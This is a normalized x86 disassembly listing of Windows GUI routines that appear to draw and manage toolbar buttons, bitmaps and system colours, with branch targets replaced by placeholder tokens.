push esi
lea eax [ eax + eax * 4 ]
push edi
mov ecx [ ebx + 0x5c ]
mov [ ebp - 0x10 ] esp
test [ ecx + eax * 4 + 0xc ] 0x1
lea esi [ ecx + eax * 4 ]
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
lea edi [ esi + 0x10 ]
je r-xdata
cmp [ ebp + 0xc ] 0x0
mov eax [ esi + 0x10 ]
jne r-xdata
mov ecx edi
call sub_4420d3
push [ ebp + 0xc ]
mov ecx edi
call sub_4422d1
jmp r-xdata
push [ ebp + 0xc ]
push eax
call sub_42d51e
pop ecx
pop ecx
test eax eax
cmp [ eax - 0x8 ] 0x0
jmp r-xdata
and [ esi + 0xc ] 0xfffffffe
test [ esi + 0xb ] 0x4
je r-xdata
push 0x1
pop eax
or [ esi + 0xc ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push 0x1
pop eax
jmp r-xdata
je r-xdata
mov edi [ edi ]
xor edi edi
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
movzx ecx [ esi + 0x8 ]
or ecx [ ebp + 0x8 ]
mov eax [ ebx ]
push edi
push ecx
push 0x401
mov ecx ebx
call [ eax + 0xa0 ]
sub_449938
push ebp
mov ebp esp
sub esp 0x6c
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
lea ecx [ ebp - 0x34 ]
push ebx
call sub_4474b9
push ebx
push ebx
push 0x31
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
mov esi [ SelectObject@IAT ]
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x2c ]
call [ GetTextMetricsA@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
push eax
push [ ebp - 0x30 ]
call esi
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x34 ]
call sub_44752b
lea eax [ ebp - 0x20 ]
push eax
call [ SetRectEmpty@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
mov ecx edi
push eax
call sub_45396c
mov eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
push 0x407
mov ecx edi
call [ eax + 0xa0 ]
mov esi [ ebp - 0x14 ]
push 0x6
sub esi [ ebp - 0x1c ]
mov ebx 0x7fff
call [ GetSystemMetrics@IAT ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x6c ]
mov edi [ edi + 0x78 ]
shl eax 0x1
sub eax esi
sub eax [ ebp - 0x60 ]
lea ecx [ eax + ecx - 0x1 ]
cmp ecx edi
jge r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x30 ]
call esi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0xc
mov ecx edi
sub_449a15
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x10 ]
push esi
mov esi ecx
push eax
call [ SetRectEmpty@IAT ]
lea eax [ ebp - 0x10 ]
push 0x1
push eax
mov ecx esi
call sub_44be6a
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
pop esi
add [ eax ] ecx
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
add [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
add [ eax + 0xc ] ecx
leave
retn 0x8
sub_449a57
xor eax eax
cmp [ ecx + 0x1c ] eax
je r-xdata
retn 0x8
mov edx [ esp + 0x4 ]
xor edx [ esp + 0x8 ]
test dh 0xf
je r-xdata
push 0x33
push eax
push eax
push eax
push eax
push eax
call sub_4417b0
sub_449a7a
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x2b
je r-xdata
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xe0 ]
push 0x1
pop eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_440622
jmp r-xdata
pop ebp
retn 0x10
sub_449ad4
push esi
mov esi ecx
push 0x0
call sub_4497f0
test eax eax
jge r-xdata
push 0x1
mov ecx esi
push [ esp + 0x10 ]
push eax
call sub_44987b
neg eax
sbb eax eax
neg eax
dec eax
or eax 0xffffffff
jmp r-xdata
pop esi
retn 0x8
sub_449b00
push ebx
mov ebx [ esp + 0x8 ]
push esi
xor esi esi
push edi
cmp ebx esi
mov edi ecx
jne r-xdata
push esi
mov ecx edi
call sub_4497f0
test eax eax
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ esp + 0x14 ]
and [ esi + eax ] 0x0
lea eax [ esi + 0x1 ]
mov ecx [ edi + 0x5c ]
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 4 ]
mov eax [ eax + 0x10 ]
mov esi [ eax - 0x8 ]
cmp esi ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push esi
push eax
push [ esp + 0x1c ]
call sub_42e2d0
add esp 0xc
lea esi [ ebx - 0x1 ]
sub_449b54
push esi
push edi
xor edi edi
mov esi ecx
push edi
call sub_4497f0
cmp eax edi
jl r-xdata
mov eax edi
pop edi
pop esi
retn 0x8
mov ecx [ esi + 0x5c ]
lea eax [ eax + eax * 4 ]
mov eax [ ecx + eax * 4 + 0x10 ]
mov edi [ eax - 0x8 ]
sub_449b8b
push esi
mov esi ecx
push edi
mov edi [ esi + 0x14 ]
push [ esi + 0x8 ]
mov ecx edi
mov [ esi + 0x18 ] 0x1
call sub_449818
and eax 0xfbffffff
cmp [ esp + 0xc ] 0x0
jne r-xdata
push eax
mov ecx edi
push [ esi + 0x8 ]
call sub_449829
pop edi
pop esi
retn 0x4
or eax 0x4000000
sub_449bc4
push esi
mov esi ecx
push edi
mov edi [ esi + 0x14 ]
push [ esi + 0x8 ]
mov ecx edi
call sub_449818
and ah 0xfd
cmp [ esp + 0xc ] 0x0
je r-xdata
push eax
mov ecx edi
push [ esi + 0x8 ]
call sub_449829
pop edi
pop esi
retn 0x4
or ah 0x2
sub_449c06
push ebp
mov ebp esp
sub esp 0x28
push esi
mov esi ecx
lea ecx [ ebp - 0x28 ]
call sub_441c49
mov ecx [ esi + 0x58 ]
xor eax eax
test ecx ecx
mov [ ebp - 0x28 ] r--data
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x20 ] eax
jbe r-xdata
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_440ea7
pop esi
leave
retn 0x8
mov ecx [ esi + 0x5c ]
lea eax [ eax + eax * 4 ]
push 0x0
mov eax [ ecx + eax * 4 ]
lea ecx [ ebp - 0x28 ]
push ecx
push 0xffffffff
push eax
mov ecx esi
mov [ ebp - 0x24 ] eax
call sub_441aa8
test eax eax
jne r-xdata
mov eax [ ebp - 0x20 ]
inc eax
cmp eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
jb r-xdata
push eax
lea ecx [ ebp - 0x28 ]
push [ ebp + 0x8 ]
call sub_441e0e
sub_449c7a
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LoadResource@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push eax
call [ LockResource@IAT ]
mov ebx eax
test ebx ebx
mov [ ebp - 0x8 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov edi [ ebx ]
add edi 0x40
push edi
call sub_42dd9c
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
push ebx
push esi
call sub_42e2d0
mov edi esi
add esp 0xc
add edi [ esi ]
mov [ ebp + 0xc ] 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add edx 0x8
inc ecx
cmp edx r--data
jb r-xdata
push [ ecx * 8 + r--data ]
lea ebx [ ecx * 8 + r--data ]
mov [ ebp - 0x4 ] ebx
call [ GetSysColor@IAT ]
push [ ebx ]
xor edx edx
mov dl ah
mov ebx edx
call [ GetSysColor@IAT ]
mov bh al
mov eax [ ebp - 0x4 ]
shl ebx 0x8
push [ eax ]
call [ GetSysColor@IAT ]
shr eax 0x10
movzx eax al
or ebx eax
mov [ edi ] ebx
cmp [ ecx * 8 + r--data ] 0x12
je r-xdata
cmp eax [ edx ]
je r-xdata
jmp r-xdata
mov eax [ edi ]
xor ecx ecx
mov edx r--data
mov edi [ esi + 0x4 ]
mov ebx [ esi + 0x8 ]
push 0x0
mov [ ebp + 0x8 ] edi
mov [ ebp + 0xc ] ebx
call [ GetDC@IAT ]
push ebx
push edi
push eax
mov [ ebp + 0x10 ] eax
call [ CreateCompatibleBitmap@IAT ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
add edi 0x4
dec [ ebp + 0xc ]
jne r-xdata
mov [ edi ] 0xffffff
jmp r-xdata
push [ ebp + 0x10 ]
push 0x0
call [ ReleaseDC@IAT ]
push esi
call sub_42ded6
mov eax [ ebp - 0x4 ]
pop ecx
push [ ebp + 0x10 ]
call [ CreateCompatibleDC@IAT ]
push [ ebp - 0x4 ]
mov ebx [ SelectObject@IAT ]
mov edi eax
push edi
call ebx
mov cl [ esi + 0xe ]
mov [ ebp - 0xc ] eax
xor eax eax
push 0xcc0020
push eax
push esi
push 0x1
pop edx
shl edx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + edx * 4 + 0x28 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
push eax
push edi
call [ StretchDIBits@IAT ]
push [ ebp - 0xc ]
push edi
call ebx
push edi
call [ DeleteDC@IAT ]
sub_449e05
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x24 ]
mov eax [ esi ]
push ecx
push [ ebp + 0x8 ]
mov ecx esi
push 0x417
call [ eax + 0xa0 ]
mov edi [ ebp + 0xc ]
and [ ebp - 0x1a ] 0x0
and [ ebp - 0x19 ] 0x0
lea eax [ ebp - 0x24 ]
xor [ edi + 0x8 ] 0x4
and [ edi + 0xa ] 0x0
and [ edi + 0xb ] 0x0
push 0x14
push eax
push edi
call sub_42dcf0
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov ecx esi
call sub_44163f
push 0x0
push 0x0
push 0x10000000
mov ecx esi
mov ebx eax
call sub_441673
mov eax [ esi ]
push 0x0
push [ ebp + 0x8 ]
mov ecx esi
push 0x416
call [ eax + 0xa0 ]
mov eax [ esi ]
push edi
push [ ebp + 0x8 ]
mov ecx esi
push 0x415
call [ eax + 0xa0 ]
and ebx 0x10000000
push 0x0
push ebx
push 0x0
mov ecx esi
call sub_441673
mov al [ edi + 0x9 ]
push 0x1
mov cl al
pop ebx
xor cl [ ebp - 0x1b ]
test bl cl
jne r-xdata
push ebx
push 0x0
test bl al
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx esi
push [ ebp + 0x8 ]
push 0x41d
call [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ edi ]
cmp eax [ ebp - 0x24 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push ebx
push eax
jmp r-xdata
push [ esi + 0x1c ]
call [ InvalidateRect@IAT ]
sub_449f0d
push esi
mov esi ecx
cmp [ esi + 0x84 ] 0x0
je r-xdata
push [ esp + 0xc ]
mov eax [ esi ]
mov ecx esi
push [ esp + 0xc ]
push 0x41d
call [ eax + 0xa0 ]
test eax eax
pop esi
jne r-xdata
call sub_449f47
retn 0x8
push [ esp + 0x8 ]
call [ SetRectEmpty@IAT ]
sub_449f47
push ebp
mov ebp esp
push ecx
push ecx
mov edx [ ecx + 0x64 ]
and [ ecx + 0x84 ] 0x0
mov eax edx
and eax 0xa000
neg eax
sbb eax eax
neg eax
test dl 0x1
je r-xdata
test eax eax
mov eax [ ecx ]
je r-xdata
test dl 0x4
je r-xdata
push 0x50
push 0x0
lea edx [ ebp - 0x8 ]
push 0x4a
push 0x0
lea edx [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ecx ]
push 0x46
push 0x0
lea edx [ ebp - 0x8 ]
jmp r-xdata
push edx
call [ eax + 0xbc ]
leave
retn
sub_449f97
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_449de6
movzx eax [ ebp - 0xc ]
movzx ecx [ ebp - 0xb ]
shl eax 0x10
or eax ecx
leave
retn 0x4
sub_449fba
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x8 ]
call sub_449de6
mov eax [ ebp + 0xc ]
cmp [ ebp - 0xb ] al
jne r-xdata
mov [ ebp - 0xb ] al
mov ecx esi
shr eax 0x10
mov [ ebp - 0xc ] al
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_449e05
mov [ esi + 0x84 ] 0x1
mov ecx eax
shr ecx 0x10
cmp [ ebp - 0xc ] cl
je r-xdata
pop esi
leave
retn 0x8
sub_44a007
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi ecx
xor ebx ebx
push ebx
push ebx
mov eax [ esi ]
push 0x455
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call [ eax + 0xa0 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
pop esi
pop ebx
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
mov ecx [ ebp + 0xc ]
push edi
mov [ ebp - 0x4 ] eax
lea edi [ ecx + 0x9 ]
test [ edi - 0x1 ] 0x8
jne r-xdata
cmp [ rw-data ] 0x40047
je r-xdata
add edi 0x14
dec [ ebp - 0x4 ]
jne r-xdata
mov al [ edi ]
mov ecx [ esi + 0x90 ]
mov [ ebp + 0x13 ] al
and [ ebp + 0x13 ] 0x1
je r-xdata
mov eax [ ebp + 0xc ]
push 0x3
add eax eax
pop ecx
cdq
idiv ecx
mov [ ebp + 0xc ] eax
mov eax [ edi - 0x9 ]
mov ecx esi
mov [ ebp + 0xc ] eax
call sub_44163f
test ah 0x8
jne r-xdata
pop edi
test al 0x8
je r-xdata
test [ edi - 0x1 ] 0x20
je r-xdata
mov eax [ ebp - 0x18 ]
add eax ecx
cmp eax [ ebp - 0x10 ]
jle r-xdata
test [ ebp - 0x8 ] 0x1
je r-xdata
mov eax [ edi - 0x9 ]
mov edx [ ebp - 0x18 ]
add eax edx
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ esi + 0x94 ]
mov edx [ ebp + 0xc ]
add eax ebx
add eax edx
jmp r-xdata
mov eax [ esi + 0x94 ]
add eax ebx
mov [ ebp - 0x10 ] eax
add ecx [ rw-data ]
cmp [ ebp + 0x13 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp eax [ ebp - 0xc ]
jle r-xdata
mov [ ebp - 0xc ] eax
add [ ebp - 0x18 ] ecx
mov eax [ edi - 0x9 ]
add [ ebp - 0x18 ] eax
jmp r-xdata
and [ ebp - 0x18 ] 0x0
add ebx [ esi + 0x94 ]
cmp [ ebp + 0x13 ] 0x0
je r-xdata
test [ edi - 0x1 ] 0x20
je r-xdata
add ebx [ ebp + 0xc ]
sub_44a129
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
xor ebx ebx
cmp [ ebp + 0xc ] esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] esi
jle r-xdata
mov eax [ ebp - 0x4 ]
pop esi
inc eax
pop ebx
leave
retn 0xc
push edi
mov edi [ ebp + 0x8 ]
inc esi
cmp esi [ ebp + 0xc ]
jl r-xdata
test [ edx + 0x9 ] 0x1
je r-xdata
lea eax [ esi + esi * 4 ]
lea edx [ edi + eax * 4 ]
and [ edx + 0x8 ] 0xdf
lea eax [ edx + 0x8 ]
test [ eax ] 0x8
jne r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x90 ]
mov edx [ edx ]
jmp r-xdata
mov ebx ecx
test esi esi
mov edx esi
jl r-xdata
lea ecx [ edx + ebx ]
cmp ecx [ ebp + 0x10 ]
jle r-xdata
lea eax [ esi - 0x1 ]
test eax eax
jl r-xdata
mov bl [ eax ]
test bl 0x20
jne r-xdata
lea edx [ eax + eax * 4 ]
lea edx [ edi + edx * 4 + 0x8 ]
test [ eax + 0x1 ] 0x1
je r-xdata
test bl 0x8
jne r-xdata
dec edx
sub eax 0x14
test edx edx
jge r-xdata
cmp [ eax - 0x4 ] 0x0
jne r-xdata
dec eax
sub edx 0x14
test eax eax
jge r-xdata
test [ edx + 0x1 ] 0x1
je r-xdata
test bl 0x8
je r-xdata
mov bl [ edx ]
test bl 0x20
jne r-xdata
jmp r-xdata
mov esi eax
xor ebx ebx
lea eax [ eax + eax * 4 ]
cmp [ edx - 0x4 ] 0x0
je r-xdata
mov esi edx
xor ebx ebx
lea eax [ edx + edx * 4 ]
jmp r-xdata
or [ edi + eax * 4 + 0x8 ] 0x20
inc [ ebp - 0x4 ]
lea eax [ edi + eax * 4 + 0x8 ]
jmp r-xdata
sub_44a203
push ebp
mov ebp esp
sub esp 0x18
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
push esi
push edi
mov edi ecx
jne r-xdata
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ecx edi
push [ ebp + 0x8 ]
call sub_44a129
push ebx
lea eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
mov ecx edi
push eax
call sub_44a007
mov esi [ eax ]
push 0x7fff
push ebx
mov ecx edi
mov eax [ eax + 0x4 ]
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_44a129
push ebx
lea eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
mov ecx edi
push eax
call sub_44a007
mov ebx [ eax ]
mov eax [ ebp + 0x10 ]
push eax
mov [ ebp + 0x14 ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44a129
push ebx
mov ecx edi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call sub_44a129
cmp eax [ ebp - 0x4 ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
lea eax [ esi + ebx ]
mov ecx edi
cdq
sub eax edx
sar eax 0x1
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44a129
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
mov ecx edi
push [ ebp + 0x8 ]
push eax
call sub_44a007
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x4 ]
cmp [ ebp + 0x10 ] ecx
jge r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
mov ecx edi
push [ ebp + 0x8 ]
push eax
call sub_44a007
push [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jle r-xdata
jle r-xdata
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
cmp esi ecx
jne r-xdata
push [ ebp + 0xc ]
mov ecx edi
push [ ebp + 0x8 ]
call sub_44a129
mov eax [ ebp + 0x14 ]
mov ecx edi
add eax ebx
cdq
sub eax edx
mov esi eax
sar esi 0x1
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44a129
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov ebx [ eax ]
jmp r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] edx
je r-xdata
cmp ebx esi
je r-xdata
mov [ ebp + 0x14 ] esi
jmp r-xdata
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp esi ebx
jge r-xdata
push ebx
push [ ebp + 0x14 ]
mov ecx edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44a129
mov ebx esi
cmp ebx [ ebp + 0x14 ]
jl r-xdata
jmp r-xdata
sub_44a358
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov ebx ecx
xor edi edi
mov eax [ ebx ]
push edi
push edi
push 0x418
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] edi
call [ eax + 0xa0 ]
mov esi eax
cmp esi edi
mov [ ebp - 0x18 ] esi
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call [ SetRectEmpty@IAT ]
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x40 ]
and esi 0x2
mov ecx ebx
push esi
push eax
call sub_44be6a
mov eax [ ebp - 0x3c ]
push esi
sub eax [ ebp - 0x34 ]
mov ecx ebx
add [ ebp - 0x2c ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x38 ]
add [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
and eax 0x1
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_44affb
mov eax [ ebp - 0x20 ]
pop edi
cmp [ ebp - 0x30 ] eax
pop esi
pop ebx
jg r-xdata
lea eax [ esi + esi * 4 ]
shl eax 0x2
push eax
call sub_441e89
test esi esi
pop ecx
mov [ ebp - 0x4 ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
cmp [ ebp - 0x2c ] eax
jg r-xdata
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x30 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
mov [ ebp - 0x2c ] eax
push [ ebp - 0x8 ]
mov ecx ebx
push edi
call sub_449de6
add [ ebp - 0x8 ] 0x14
inc edi
cmp edi esi
jl r-xdata
xor edi edi
cmp esi edi
jle r-xdata
mov eax [ ebx + 0x64 ]
test al 0x2
jne r-xdata
push esi
lea eax [ ebp - 0x20 ]
push [ ebp - 0x4 ]
mov ecx ebx
push eax
call sub_44a007
mov ecx [ eax ]
test [ ebp + 0xc ] 0x40
mov eax [ eax + 0x4 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] eax
je r-xdata
mov ecx eax
and ecx 0x4
mov [ ebp - 0x1c ] ecx
je r-xdata
push [ ebp - 0x4 ]
call sub_441eb2
pop ecx
mov eax [ ebx + 0x84 ]
and [ ebx + 0x84 ] 0x0
test esi esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp + 0xc ]
push edi
and al 0x2
neg al
sbb eax eax
and eax 0x7fff
push eax
test [ ebp + 0xc ] 0x4
jne r-xdata
mov eax [ ebx + 0x64 ]
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx esi
add eax 0x4
mov [ ebp - 0x14 ] eax
push edi
push [ ebx + 0x54 ]
jmp r-xdata
test [ ebp + 0xc ] 0x8
je r-xdata
and [ ebp + 0x10 ] 0x0
test esi esi
jle r-xdata
test al 0x4
je r-xdata
add eax 0x14
dec ecx
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
push esi
mov ecx ebx
push [ ebp - 0x4 ]
call sub_44a203
test [ ebp + 0xc ] 0x10
je r-xdata
push edi
push 0x7fff
jmp r-xdata
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x30 ]
mov [ ebx + 0x54 ] eax
test [ eax + 0x5 ] 0x1
je r-xdata
test edi edi
jle r-xdata
inc edi
cmp [ ebp + 0x10 ] 0xffffffff
je r-xdata
push edi
push edi
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebx + 0x84 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] edi
lea esi [ eax + 0x8 ]
mov [ ebp + 0x10 ] esi
push [ ebp - 0xc ]
mov ecx ebx
push [ ebp + 0x10 ]
call sub_449e05
inc [ ebp + 0x10 ]
add [ ebp - 0xc ] 0x14
cmp [ ebp + 0x10 ] esi
jl r-xdata
lea eax [ edi + edi * 2 ]
shl eax 0x3
push eax
call sub_441e89
test eax eax
pop ecx
je r-xdata
test al 0x1
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call [ SetRectEmpty@IAT ]
mov eax [ ebp + 0xc ]
mov ecx ebx
and eax 0x2
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_44be6a
mov eax [ ebp + 0xc ]
and eax 0x20
je r-xdata
add esi 0x18
dec [ ebp - 0x14 ]
mov [ ebp + 0x10 ] esi
jne r-xdata
lea ecx [ ebp - 0x40 ]
push ecx
push [ eax + 0x1c ]
call [ GetWindowRect@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ ebp - 0x3c ]
mov eax [ esi ]
mov esi [ ebp - 0x40 ]
sub edi ecx
lea ecx [ ebp - 0x40 ]
push ecx
mov ecx [ ebp + 0x10 ]
sub esi eax
mov eax [ ebx ]
push [ ecx - 0x8 ]
mov ecx ebx
call [ eax + 0xe0 ]
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x18 ]
add esi eax
mov eax [ ebp - 0x3c ]
add edi eax
xor eax eax
push 0x15
push eax
push eax
push edi
push esi
push eax
call sub_4417b0
mov esi [ ebp + 0x10 ]
xor eax eax
dec edi
mov [ ebp + 0x10 ] edi
jmp r-xdata
mov ecx [ ebp - 0x20 ]
sub ecx [ ebp - 0x28 ]
mov ecx [ ebp - 0x1c ]
sub ecx [ ebp - 0x24 ]
jmp r-xdata
push [ esi - 0x4 ]
mov ecx ebx
call sub_441585
test eax eax
mov [ ebp - 0x18 ] eax
je r-xdata
push [ ebp - 0x10 ]
call sub_441eb2
pop ecx
inc [ ebp + 0x10 ]
add eax 0x14
cmp [ ebp + 0x10 ] esi
mov [ ebp - 0x14 ] eax
jl r-xdata
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x10 ] 0x0
mov [ ebp - 0x10 ] eax
lea edi [ eax + 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x14 ] eax
push eax
mov eax [ ebp + 0x10 ]
add ecx eax
push ecx
jmp r-xdata
test [ eax + 0x5 ] 0x1
je r-xdata
mov edi [ ebp - 0xc ]
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x40 ]
mov [ edi - 0x8 ] ecx
mov eax [ eax ]
mov [ edi - 0x4 ] eax
mov eax [ ebx ]
push edx
push ecx
mov ecx ebx
call [ eax + 0xe0 ]
lea eax [ ebp - 0x40 ]
mov ecx ebx
push eax
call sub_4473ab
lea esi [ ebp - 0x40 ]
inc [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x8 ] 0x18
mov eax [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x18 ]
mov edi [ ebp - 0x8 ]
sub_44a681
mov edx [ esp + 0xc ]
xor eax eax
cmp [ esp + 0x8 ] eax
push 0xffffffff
setne al
neg edx
sbb edx edx
and edx 0x2
or eax edx
push eax
push [ esp + 0xc ]
call sub_44a358
mov eax [ esp + 0x4 ]
retn 0xc
sub_44a6aa
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_44a358
mov eax [ ebp + 0x8 ]
test al 0x44
jne r-xdata
mov edx eax
and edx 0x8
jne r-xdata
push esi
mov esi [ ecx ]
and eax 0x1
push edx
push eax
push [ ebp + 0x8 ]
call [ esi + 0xb8 ]
mov eax [ ebp + 0x8 ]
pop esi
jmp r-xdata
test al 0x10
je r-xdata
pop ebp
retn 0xc
sub_44a6ef
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
push ebx
mov esi ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43f10c
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ esi ]
xor edi edi
push edi
push edi
push 0x418
mov ecx esi
call [ eax + 0xa0 ]
test eax eax
mov [ ebp + 0x10 ] eax
jle r-xdata
or eax 0xffffffff
mov eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push edi
push 0x41d
mov ecx esi
call [ eax + 0xa0 ]
test eax eax
je r-xdata
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
push [ ebp + 0xc ]
inc [ ebp - 0x4 ]
inc [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push eax
call [ PtInRect@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x24 ]
push ecx
push edi
push 0x417
mov ecx esi
call [ eax + 0xa0 ]
test eax eax
je r-xdata
test [ ebp - 0x1b ] 0x1
je r-xdata
push edi
mov ecx esi
call sub_449ef4
test ebx ebx
je r-xdata
test eax eax
jne r-xdata
cmp [ ebx ] 0x28
jb r-xdata
mov ecx [ esi + 0x1c ]
lea edi [ ebx + 0x10 ]
